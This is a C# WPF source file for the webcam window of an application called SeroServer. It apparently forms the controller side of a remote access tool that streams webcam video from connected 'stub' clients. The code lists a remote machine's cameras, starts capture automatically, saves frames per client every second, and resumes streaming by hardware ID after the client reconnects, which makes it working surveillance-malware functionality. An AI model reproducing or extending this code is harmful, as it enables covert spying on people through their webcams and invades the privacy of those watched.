using System.IO;
using System.Linq;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using DevExpress.Xpf.Core;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class WebcamWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private string _clientId;
    private readonly string _hwid;
    private System.Windows.Threading.DispatcherTimer? _reconnectTimer;
    private int _reconnectCountdown;
    private bool _wasStreaming;
    private volatile bool _closed, _streaming;
    private int _frameCount;
    private DateTime _fpsTime = DateTime.UtcNow;
    private DateTime _lastAutoSave = DateTime.MinValue;

    public WebcamWindow(TlsServer server, string clientId)
    {
        _server   = server;
        _clientId = clientId;
        _hwid     = server.ConnectedClients.TryGetValue(clientId, out var cc) ? cc.Hwid : string.Empty;
        InitializeComponent();
        WindowResizer.Enable(this);

        TxtClientId.Text = $"[ {clientId} ]";

        SldQuality.Value     = UiPrefs.GetInt("WcamQuality", 20);
        TxtQuality.Text      = $"{(int)SldQuality.Value}";
        SldFps.Value         = UiPrefs.GetInt("WcamFps", 20);
        TxtFpsVal.Text       = $"{(int)SldFps.Value}";
        CmbResolution.SelectedIndex = UiPrefs.GetInt("WcamRes", 4);
        ChkAutoStart.IsChecked = UiPrefs.GetInt("WcamAutoStart", 0) == 1;

        SldQuality.ValueChanged += (_, e) => { TxtQuality.Text = $"{(int)e.NewValue}"; UiPrefs.Set("WcamQuality", (int)e.NewValue); };
        SldFps.ValueChanged     += (_, e) => { TxtFpsVal.Text  = $"{(int)e.NewValue}"; UiPrefs.Set("WcamFps",    (int)e.NewValue); };
        CmbResolution.SelectionChanged += (_, _) => UiPrefs.Set("WcamRes", CmbResolution.SelectedIndex);

        _server.WcamFrameReceived  += OnWcamData;
        _server.ClientDisconnected += OnClientDisconnected;
        _server.ClientConnected += OnClientConnected;
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _closed = true;
            _reconnectTimer?.Stop();
            _server.WcamFrameReceived  -= OnWcamData;
            _server.ClientDisconnected -= OnClientDisconnected;
            _server.ClientConnected -= OnClientConnected;
            if (_streaming) SendStop();
            Lang.LanguageChanged -= ApplyLanguage;
        };

        // Fade-in animation
        Opacity = 0;
        Loaded += (_, _) =>
        {
            BeginAnimation(OpacityProperty,
                new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(180)));
            SendProbe(); // request device list on open
        };
    }

    // ── Fullscreen ────────────────────────────────────────────────────────────

    private void ApplyLanguage() { this.Title = Lang.Get("FEAT_REMOTE_WEBCAM"); }

    private void BtnFullscreen_Click(object s, RoutedEventArgs e)
    {
        if (WindowState == WindowState.Maximized)
        {
            WindowState = WindowState.Normal;
            BtnFullscreen.Content = "⛶";
        }
        else
        {
            WindowState = WindowState.Maximized;
            BtnFullscreen.Content = "❐";
        }
    }

    // ── Hamburger menu ─────────────────────────────────────────────────────────────────

    private void BtnMenu_Click(object sender, RoutedEventArgs e)
    {
        if (sender is System.Windows.Controls.Button btn)
        {
            var mainWindow = Application.Current.Windows.OfType<ServerWindow>().FirstOrDefault();
            if (mainWindow == null) return;
            var menu = FeatureContextMenu.Build(_server, _clientId, mainWindow, "WebcamWindow");
            btn.ContextMenu = menu;
            menu.PlacementTarget = btn;
            menu.Placement = System.Windows.Controls.Primitives.PlacementMode.Bottom;
            menu.IsOpen = true;
        }
    }

    // ── Streaming state ───────────────────────────────────────────────────────

    private void SetStreamingState(bool streaming)
    {
        _streaming = streaming;
        Dispatcher.BeginInvoke(() =>
        {
            BtnStart.IsEnabled   = !streaming;
            BtnStart.Opacity     = streaming ? 0.35 : 1.0;
            BtnStop.IsEnabled        = streaming;
            BtnStop.Opacity          = streaming ? 1.0 : 0.35;
            ChkAutoSave.IsEnabled    = streaming;
            ChkAutoSave.Opacity      = streaming ? 1.0 : 0.4;
            if (!streaming) ChkAutoSave.IsChecked = false;
            SldQuality.IsEnabled     = !streaming;
            SldFps.IsEnabled         = !streaming;
            CmbDevice.IsEnabled      = !streaming;
            CmbResolution.IsEnabled  = !streaming;
            TxtStatus.Text       = streaming ? Lang.Get("STATUS_STREAMING") : Lang.Get("STOPPED");
            StatusDot.Fill       = new System.Windows.Media.SolidColorBrush(streaming
                ? System.Windows.Media.Color.FromRgb(0x22, 0xC5, 0x5E)
                : System.Windows.Media.Color.FromRgb(0x25, 0x28, 0x40));
            LiveBadge.Visibility = streaming ? Visibility.Visible : Visibility.Collapsed;
            if (streaming)
            {
                TxtPlaceholder.Visibility = Visibility.Collapsed;
                LogPanel.Visibility = Visibility.Collapsed;
            }
            if (!streaming) TxtFps.Text = "";
        });
    }

    // ── Outgoing ──────────────────────────────────────────────────────────────

    private void SendProbe()
    {
        LogPanel.Visibility = Visibility.Collapsed;
        TxtPlaceholder.Text = Lang.Get("WEBCAM_WAITING");
        TxtPlaceholder.Visibility = Visibility.Visible;
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.WcamStart,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new { DeviceIndex = -1, Quality = 0, Fps = 0 })
        });
    }

    private static int ResolutionToMaxHeight(int index) => index switch
    {
        1 => 720, 2 => 480, 3 => 360, 4 => 240, _ => 0
    };

    private async void TxtClientId_MouseLeftButtonUp(object sender, MouseButtonEventArgs e)
    {
        Clipboard.SetText(_clientId);
        TxtClientId.Text = Lang.Get("COPIED");
        TxtClientId.Foreground = new SolidColorBrush(Color.FromRgb(0x22, 0xC5, 0x5E));
        await Task.Delay(1500);
        TxtClientId.Text = _clientId;
        TxtClientId.Foreground = new SolidColorBrush(Color.FromRgb(0x88, 0x90, 0xB8));
    }

    private void SendStart()
    {
        int idx = CmbDevice.SelectedIndex;
        if (idx < 0) { TxtStatus.Text = Lang.Get("ERR_NO_DEVICE"); return; }
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.WcamStart,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new
            {
                DeviceIndex = idx,
                Quality     = (int)SldQuality.Value,
                Fps         = (int)SldFps.Value,
                MaxHeight   = ResolutionToMaxHeight(CmbResolution.SelectedIndex)
            })
        });
        SetStreamingState(true);
        ServerWindow.ReportGlobalActivity("Webcam started", _clientId, "running");
        ServerWindow.LogGlobal($"[WEBCAM] Webcam stream started on client {_clientId}.");
    }

    private void SendStop()
    {
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.WcamStop, Data = "{}" });
        SetStreamingState(false);
        ServerWindow.ReportGlobalActivity("Webcam stopped", _clientId, "complete");
        ServerWindow.LogGlobal($"[WEBCAM] Webcam stream stopped on client {_clientId}.");
    }

    // ── Incoming ──────────────────────────────────────────────────────────────

    private void OnWcamData(string clientId, string json)
    {
        if (_closed || clientId != _clientId) return;
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            // Debug logs from stub are silently discarded (no display pollution)
            if (root.TryGetProperty("log", out _))
                return;

            // Error from stub
            if (root.TryGetProperty("error", out var errEl))
            {
                string msg = errEl.GetString() ?? "Unknown error";
                Dispatcher.BeginInvoke(() =>
                {
                    TxtStatus.Text = msg;
                    TxtPlaceholder.Text = msg;
                    TxtPlaceholder.Visibility = Visibility.Visible;
                    SetStreamingState(false);
                });
                return;
            }

            // Device list — extract names before BeginInvoke; doc is disposed when method returns
            if (root.TryGetProperty("devices", out var devList))
            {
                var names = devList.EnumerateArray()
                    .Select((d, i) => d.ValueKind == System.Text.Json.JsonValueKind.Object
                        ? (d.TryGetProperty("name", out var nEl) ? nEl.GetString() : null) ?? $"Device {i}"
                        : d.GetString() ?? $"Device {i}")
                    .ToList();
                Dispatcher.BeginInvoke(() =>
                {
                    CmbDevice.Items.Clear();
                    foreach (var name in names) CmbDevice.Items.Add(name);
                    int count = names.Count;
                    if (count == 0)
                    {
                        TxtStatus.Text = Lang.Get("WEBCAM_NO_FOUND");
                        TxtPlaceholder.Text = Lang.Get("WEBCAM_NO_FOUND");
                        TxtPlaceholder.Visibility = Visibility.Visible;
                    }
                    else
                    {
                        if (!_streaming || CmbDevice.SelectedIndex < 0 || CmbDevice.SelectedIndex >= count)
                        {
                            CmbDevice.SelectedIndex = 0;
                            CmbDevice.Text = CmbDevice.Items[0]?.ToString() ?? "";
                        }
                        TxtStatus.Text = string.Format(Lang.Get("WEBCAM_DEVICE_COUNT"), count);
                        if (ChkAutoStart.IsChecked == true && !_streaming)
                            SendStart();
                    }
                });
                return;
            }

            // Frame
            if (!root.TryGetProperty("j", out var jEl)) return;
            string j64 = jEl.GetString() ?? "";
            if (string.IsNullOrEmpty(j64)) return;

            Task.Run(() =>
            {
                try
                {
                    _bytesReceived += json.Length;
                    var bytes = Convert.FromBase64String(j64);
                    using var ms = new MemoryStream(bytes);
                    var bi = new BitmapImage();
                    bi.BeginInit();
                    bi.StreamSource = ms;
                    bi.CacheOption = BitmapCacheOption.OnLoad;
                    bi.EndInit();
                    bi.Freeze();
                    if (!_closed) Dispatcher.BeginInvoke(() => ShowFrame(bi));
                }
                catch { }
            });
        }
        catch { }
    }
    
    private void SendAck() =>
        _ = _server.SendToClient(_clientId,
            new Packet { Type = PacketType.WcamFrameAck, Data = "{}" });

    private void ShowFrame(BitmapImage bi)
    {
        if (_closed || !_streaming) return;
        ImgFrame.Source = bi;
        TxtPlaceholder.Visibility = Visibility.Collapsed;
        _frameCount++;
        var now = DateTime.UtcNow;
        if ((now - _fpsTime).TotalSeconds >= 1)
        {
            TxtFps.Text = $"{_frameCount} fps";
            _frameCount = 0;
            _fpsTime = now;
            UpdateMetrics();
        }

        // Auto-save: one frame per second while checkbox is checked
        if (ChkAutoSave.IsChecked == true && (now - _lastAutoSave).TotalSeconds >= 1.0)
        {
            _lastAutoSave = now;
            SaveFrame(bi);
        }
        
        if (!_closed) SendAck();
    }
    
    private int _bytesReceived;
    
    private void UpdateMetrics()
    {
        double mbps = (_bytesReceived * 8.0) / 1000000.0;
        TxtBandwidth.Text = $"{mbps:F1} Mbps";
        _bytesReceived = 0;
        
        if (_server.ConnectedClients.TryGetValue(_clientId, out var client))
        {
            int ping = client.PingMs;
            TxtPing.Text = $"{ping} ms";
            if (ping < 100) {
                SignalIcon.Foreground = new SolidColorBrush(Color.FromRgb(0x22, 0xC5, 0x5E));
            } else if (ping < 250) {
                SignalIcon.Foreground = new SolidColorBrush(Color.FromRgb(0xF5, 0x9E, 0x0B));
            } else {
                SignalIcon.Foreground = new SolidColorBrush(Color.FromRgb(0xEF, 0x44, 0x44));
            }
        }
    }

    private void SaveFrame(BitmapImage bi)
    {
        Task.Run(() =>
        {
            try
            {
                var dir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Clients", _clientId, "Webcam");
                Directory.CreateDirectory(dir);
                var path = Path.Combine(dir, $"{DateTime.Now:yyyyMMdd_HHmmss}.jpg");
                using var fs = File.Create(path);
                var enc = new System.Windows.Media.Imaging.JpegBitmapEncoder { QualityLevel = 95 };
                enc.Frames.Add(System.Windows.Media.Imaging.BitmapFrame.Create(bi));
                enc.Save(fs);
                Dispatcher.BeginInvoke(() => TxtStatus.Text = string.Format(Lang.Get("SAVED"), Path.GetFileName(path)));
            }
            catch { }
        });
    }

    // ── UI ────────────────────────────────────────────────────────────────────

    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
    {
        if (c.Id != _clientId) return;
        Dispatcher.BeginInvoke(() =>
        {
            _wasStreaming = _streaming;
            if (_streaming) SetStreamingState(false);
            _reconnectCountdown = 60;
            TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
            ReconnectOverlay.Visibility = Visibility.Visible;
            TxtStatus.Text = Lang.Get("CONN_LOST");
            ServerWindow.ReportGlobalActivity("⚡ Connection lost", _clientId, "failed");

            _reconnectTimer?.Stop();
            _reconnectTimer = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
            _reconnectTimer.Tick += (_, _) =>
            {
                _reconnectCountdown--;
                TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
                if (_reconnectCountdown <= 0)
                {
                    _reconnectTimer.Stop();
                    ServerWindow.ReportGlobalActivity("✗ Reconnect timeout", _hwid.Length > 8 ? _hwid[..8] : _hwid, "failed");
                    Close();
                }
            };
            _reconnectTimer.Start();
        });
    }

    private void OnClientConnected(SeroServer.Data.ConnectedClient c)
    {
        if (string.IsNullOrEmpty(_hwid) || c.Hwid != _hwid) return;
        Dispatcher.BeginInvoke(() =>
        {
            if (_closed) return;
            _clientId = c.Id;

            // Hide overlay, cancel timer
            _reconnectTimer?.Stop();
            ReconnectOverlay.Visibility = Visibility.Collapsed;

            // Update UI
            TxtClientId.Text = $"[ {_clientId} ]";
            TxtStatus.Text = Lang.Get("RECONNECTED");
            ServerWindow.ReportGlobalActivity("✓ Reconnected (Webcam)", _clientId, "complete");

            // Auto-resume streaming if it was active before disconnect
            if (_wasStreaming)
            {
                _wasStreaming = false;
                SendProbe(); // request device list first
                // Delay slightly to let device list arrive, then start
                var resumeTimer = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromMilliseconds(1500) };
                resumeTimer.Tick += (_, _) =>
                {
                    resumeTimer.Stop();
                    if (!_closed && !_streaming) SendStart();
                };
                resumeTimer.Start();
            }
        });
    }

    private void ChkAutoSave_Changed(object s, RoutedEventArgs e)
    {
        if (ChkAutoSave.IsChecked == true)
        {
            _lastAutoSave = DateTime.MinValue; // save immediately on first frame
            TxtStatus.Text = Lang.Get("WEBCAM_AUTOSAVE_ON");
        }
        else
        {
            TxtStatus.Text = Lang.Get("WEBCAM_AUTOSAVE_OFF");
        }
    }

    private void ChkAutoStart_Changed(object s, RoutedEventArgs e) =>
        UiPrefs.Set("WcamAutoStart", ChkAutoStart.IsChecked == true ? 1 : 0);

    private void BtnStart_Click(object s, RoutedEventArgs e) => SendStart();
    private void BtnStop_Click(object s, RoutedEventArgs e)
    {
        SendStop();
        _wasStreaming = false;  // Prevent auto-resume on reconnect if user explicitly stops
    }
    private void Close_Click(object s, RoutedEventArgs e)    => Close();

    private void BtnRemoteDesktop_Click(object s, RoutedEventArgs e)
    {
        var mainWin = Application.Current.MainWindow as ServerWindow;
        if (mainWin == null) return;

        mainWin.OpenFeatureWindow<RemoteDesktopWindow>(_clientId, () =>
        {
            var area = SystemParameters.WorkArea;
            const int margin = 40;
            var w = new RemoteDesktopWindow(_server, _clientId);
            w.Left = area.Left + margin;
            w.Top  = area.Top  + margin;
            return w;
        });
    }

}
